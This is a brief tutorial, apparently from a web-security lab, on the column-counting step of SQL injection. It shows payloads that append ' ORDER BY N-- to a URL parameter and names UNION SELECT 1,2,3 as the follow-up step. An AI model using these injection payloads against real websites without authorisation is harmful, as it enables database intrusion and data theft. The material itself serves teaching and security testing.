```
ORDER BY
```

`ORDER BY` is used to check how many colum in a table.

Example:

```
website.com/filter?category=Accessories' ORDER BY 1--
website.com/filter?category=Accessories' ORDER BY 2--
website.com/filter?category=Accessories' ORDER BY 3--
```

The query will work until the column number **exceeds the real column count**.

---

visual of query columns

```
Database Query
--------------------------------
SELECT name, price, description
--------------------------------

Column Positions
+------+-------+-------------+
|  1   |   2   |      3      |
+------+-------+-------------+
| name | price | description |
+------+-------+-------------+
```

---

Testing ORDER BY

```
?id=1 ORDER BY 1   ✓ Works
?id=1 ORDER BY 2   ✓ Works
?id=1 ORDER BY 3   ✓ Works
?id=1 ORDER BY 4   ✗ ERROR
```

---

visual explanation

```
Actual Query
--------------------------------
SELECT name, price, description
--------------------------------
Total Columns = 3


Testing ORDER BY
--------------------------------
ORDER BY 1   ✓
ORDER BY 2   ✓
ORDER BY 3   ✓
ORDER BY 4   ✗ (Column does not exist)
--------------------------------
```

Final Result

```
Total Columns = 3
```

---

Then the next step becomes:

```
UNION SELECT 1,2,3
```

to identify **which column reflects on the page**.
